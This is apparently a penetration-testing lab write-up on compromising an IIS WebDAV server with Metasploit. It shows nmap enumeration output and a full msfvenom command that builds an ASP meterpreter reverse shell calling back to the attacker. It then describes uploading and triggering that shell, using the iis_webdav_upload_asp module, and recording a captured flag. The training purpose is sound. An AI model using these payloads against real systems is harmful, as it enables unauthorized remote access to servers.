# Exploiting WebDAV with Metasploit

We can use davtest and cadaver to properly exploit a WebDAV, however, there are a couple of techniques that can be used with metasploit to get the same result.

In this laboratory we will complete a similar exercise to the previous one.

- We will start by performing an nmap scan to identify the webdav server and we will also include a script to enum the http server.

result:
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0

**Note**: We don't really have access to the webdav server, but credentials were given by the lab environment instructions.

**Note**: Taking a look at the webdav server we can see that we have access from the browser. The first technique with metasploit we are going to utilize is generating the asp payload with MSF venom. MSF venom is a metasploit tool that allows you to generate payloads that will essentially provide you with reverse shell access to a target system. In this case we will try to establish a meterpreter session which is an advanced reverse shell that allows us to perform additional functionalities like upload/download files from the target, etc.

- To generate the revershell script we will use the the msfvenom tool. We need to specify a staged payload that comes prepackaged in msfvenom as `windows/meterpreter/reverse_tcp`, we need to specify the LHOST (our kali linux) and the LPORT (available open port to listen) and the file type then we need to save the output to a file. It goes like this: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-open-port> -f asp > shell.asp`.

**Note**: It is preferable to use the 32-bit meterpreter when creating the reverse shell, it will always work whether the target system is 32-bits or 64-bits.

- After we have generated the reverse shell code, we need to upload it with cadaver. Just like the previous lesson.

- In order to properly execute the reverse shell with meterpreter, we need to listen with our machine in the port we specified during the creation of the shell code, it will handle the request and send back the stage that will then provide us with the meterpreter session.

**Note**: Remember to start the postgresql database to continue with the next step.

- We need to activate the msfconsole and then select the module `multi/handler`, this will let us listen to a port to handle the request we are going to receive to activate the reverse shell on the target machine. You need to specify the payload we chose to create the malicious shell code, LHOST (our address) and the LPORT we specified in the previous step. Finally we run it and it will stay listening on the specified port for a connection.

- Click the malicious payload in the webdav session in the browser, and if everything works as expected, the msfconsole will establish a connection with meterpreter in the terminal.

**Note**: After establishing the connection delete the malicious payload using cadaver.

**Note**: In this particular lab we already have elevated privileges as we will establish the connection as NT AUTHORITY\SYSTEM so there's no need to try to escalate privileges.

**Note**: All the steps we followed previously is how we can do it manually, but with the following module of the metasploit framework we can do it much more easier.

- Now for the second technique we will use the msf module `exploit/windows/iis/iis_webdav_upload_asp`, it will allow us to upload the asp file to the webdav server and start a meterpreter session automatically. This module will generate the asp payload and upload it so you need to specify the HttpPassword and HttpUsername, the RHOST (target), the LHOST and LPORT, and the full PATH of the file it will be uploaded to. When everything is set up run it and it will establish the connection with meterpreter automatically.

**Note**: meterpreter works as a linux command line interface, so linux commands are available even if the target is a windows machine.

found flag in C:\flag.txt: d3aff16a801b4b7d36b4da1094bee345.

